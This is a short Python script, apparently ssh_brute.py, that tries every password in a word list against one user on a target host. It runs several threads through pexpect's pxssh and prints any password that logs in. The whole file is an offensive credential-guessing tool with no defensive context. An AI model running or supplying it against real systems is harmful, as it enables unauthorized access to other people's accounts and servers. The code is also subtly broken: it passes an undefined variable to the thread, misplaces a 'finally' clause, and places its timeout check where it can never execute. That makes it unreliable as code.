from pexpect import pxssh
import argparse, time, threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0

def connect(host, user, pwd, release=True):
	global Found
	global Fails
	
	try:
		s = pxssh.pxssh()
		s.login(host, user, pwd)
		print(f'\n Password Found: {pwd}')
		Found = True
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, pwd, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, pwd, False)
		finally:
			if release:
				connection_lock.release()					


def main():
	parser = argparse.ArgumentParser(usage='ssh_brute.py TARGET_HOST -u USERNAME -f PASSWD_FILE')
	parser.add_argument('tgt_host', metavar='TARGET_HOST', help='specify target host\'s IP address')
	parser.add_argument('-u', metavar='USERNAME', help='specify username', required=True)
	parser.add_argument('-f', metavar='PASSWD_FILE', help='specify password file', required=True)
	
	args = parser.parse_args()
	host = args.tgt_host
	pwd_file = args.f
	user = args.u
	
	with open(pwd_file) as p_file:
		for line in p_file.readlines():
			if Found:
				print('\n Password found')
				exit(0)
				if Fails > 5:
					print('\n Too many socket timeouts')
					exit(0)
			connection_lock.acquire()
			password =line.strip('\r').strip('\n')
			print('\nTesting: '+ str(password))
			t = threading.Thread(target=connect, args=(host, user, passwords))
			t.start()		


if __name__ == '__main__':
	main()
